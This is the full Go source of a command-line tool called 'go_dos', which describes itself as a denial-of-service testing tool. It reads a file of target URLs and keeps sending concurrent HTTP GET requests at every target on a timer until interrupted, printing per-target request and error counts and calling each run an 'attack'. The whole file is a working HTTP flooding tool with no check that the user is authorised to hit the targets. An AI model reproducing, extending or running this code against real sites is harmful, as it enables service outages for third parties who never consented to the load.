package main

import (
	"bufio"
	"context"
	"errors"
	"fmt"
	"net/http"
	url2 "net/url"
	"os"
	"os/signal"
	"sort"
	"strings"
	"time"

	"github.com/gosuri/uilive"
	"github.com/pterm/pterm"
	"github.com/urfave/cli/v2"
)

type (
	stat struct {
		target   string
		req, err bool
	}
	stats struct {
		reqNum, errNum int
	}
)

func main() {
	app := &cli.App{
		Name:  "go_dos",
		Usage: "Denial of service cli testing tool",
		Flags: []cli.Flag{
			&cli.StringFlag{
				Name:    "file",
				Aliases: []string{"f"},
				Usage:   "Load targets from `FILE`",
			},
			&cli.IntFlag{
				Name:    "rounds",
				Aliases: []string{"r"},
				Usage:   "Number of rounds per target per single time span",
				Value:   100,
			},
			&cli.IntFlag{
				Name:    "timeout",
				Aliases: []string{"t"},
				Usage:   "Single request timeout in milliseconds",
				Value:   1000,
			},
			&cli.IntFlag{
				Name:    "stats",
				Aliases: []string{"s"},
				Usage:   "Stats update time step in seconds",
				Value:   5,
			},
			&cli.IntFlag{
				Name:    "pace",
				Aliases: []string{"p"},
				Usage:   "Time between attacks in milliseconds, should be grater then `timeout`",
				Value:   2000,
			},
		},
	}

	app.Action = func(c *cli.Context) error {
		filePath := c.String("file")
		if filePath == "" {
			pterm.Error.Println("Please specify file with targets")
			return fmt.Errorf("no target file")
		}
		targets, err := readFile(filePath)
		if err != nil {
			pterm.Error.Println("Please specify valid file path with targets")
			return err
		}

		requestTimeout := c.Int("time")
		loopTimeout := c.Int("pace")
		statsTimeout := c.Int("stats")
		rounds := c.Int("rounds")
		if requestTimeout > loopTimeout {
			pterm.Error.Println("Please specify time smaller than pace")
			return fmt.Errorf("time: %v larger than pace %v", requestTimeout, loopTimeout)
		}
		if statsTimeout == 0 {
			statsTimeout = 1
		}
		if rounds == 0 {
			rounds = 1
		}

		run(targets, rounds, time.Millisecond*time.Duration(requestTimeout), time.Millisecond*time.Duration(loopTimeout), time.Second*time.Duration(statsTimeout))
		return nil
	}

	err := app.Run(os.Args)
	if err != nil {
		pterm.Error.Printf("Cannot run app, %s/n", err)
	}
}

func readFile(filePath string) ([]string, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)

	set := make(map[string]struct{})
	for scanner.Scan() {
		url, err := url2.Parse(scanner.Text())
		if err == nil {
			set[url.String()] = struct{}{}
		}
	}
	targets := make([]string, 0, len(set))
	for k := range set {
		targets = append(targets, k)
	}

	if len(targets) == 0 {
		return nil, errors.New("no valid targets avaliable")
	}

	return targets, nil
}

func run(targets []string, rounds int, requestTimeout, loopTimeout, statsTimeout time.Duration) {
	ctx, cancel := context.WithCancel(context.Background())
	go func(cancel func()) {
		sigint := make(chan os.Signal, 1)
		signal.Notify(sigint, os.Interrupt)
		<-sigint
		cancel()
	}(cancel)

	statCH := make(chan stat, rounds*len(targets))
	statsCH := make(chan map[string]stats)

	go displayStats(ctx, statsCH)
	go countStats(ctx, statCH, statsCH, statsTimeout)

	client := &http.Client{Timeout: requestTimeout}
	t := time.NewTicker(loopTimeout)
Loop:
	for {
		select {
		case <-ctx.Done():
			break Loop
		case <-t.C:
			go func(ctx context.Context) {
				for i := 0; i < rounds; i++ {
					for _, k := range targets {
						target := k
						go fetch(ctx, client, target, statCH, requestTimeout)
					}
				}
			}(ctx)
		}
	}

}

func fetch(ctx context.Context, client *http.Client, target string, statCh chan<- stat, requestTimeout time.Duration) {
	ctxx, cancel := context.WithTimeout(ctx, requestTimeout)
	req, err := http.NewRequestWithContext(ctxx, "GET", target, nil)
	if err != nil {
		pterm.Error.Printf("error when generating request to target %s, %s", target, err)
		cancel()
		return
	}
	resp, err := client.Do(req)
	if err != nil {
		statCh <- stat{target: target, err: true}
		cancel()
		return
	}
	if resp.Body != nil {
		resp.Body.Close()
	}
	statCh <- stat{target: target, req: true}
}

func countStats(ctx context.Context, statCh <-chan stat, statsCh chan<- map[string]stats, statsTimeout time.Duration) {
	t := time.NewTicker(statsTimeout)
	statsMap := make(map[string]stats)

Loop:
	for {
		select {
		case <-ctx.Done():
			close(statsCh)
			break Loop
		case <-t.C:
			statsCh <- statsMap
			statsMap = make(map[string]stats)
		case s := <-statCh:
			if v, ok := statsMap[s.target]; ok {
				if s.req {
					v.reqNum++
				}
				if s.err {
					v.errNum++
				}
				statsMap[s.target] = v
				continue
			}
			v := stats{}
			if s.req {
				v.reqNum = 1
			}
			if s.err {
				v.errNum = 1
			}
			statsMap[s.target] = v
		}
	}
}

func displayStats(ctx context.Context, statsCh <-chan map[string]stats) {
	spinnerLiveText, _ := pterm.DefaultSpinner.Start("Starting attack...")

	writer := uilive.New()
	writer.Start()
Loop:
	for {
		select {
		case <-ctx.Done():
			break Loop
		case stats := <-statsCh:
			keys := make([]string, 0, len(stats))
			for k := range stats {
				keys = append(keys, k)
			}

			sort.Strings(keys)
			buf := strings.Builder{}
			for _, k := range keys {
				buf.WriteString(fmt.Sprintf("T: %s, R: %v, E: %v\n", k, stats[k].reqNum, stats[k].errNum))
			}
			spinnerLiveText.UpdateText("Attack continues...")
			fmt.Println()
			fmt.Fprintln(writer, buf.String())
		}
	}
	spinnerLiveText.Stop()
	writer.Stop()
	pterm.Success.Println("Attack finished.")
}
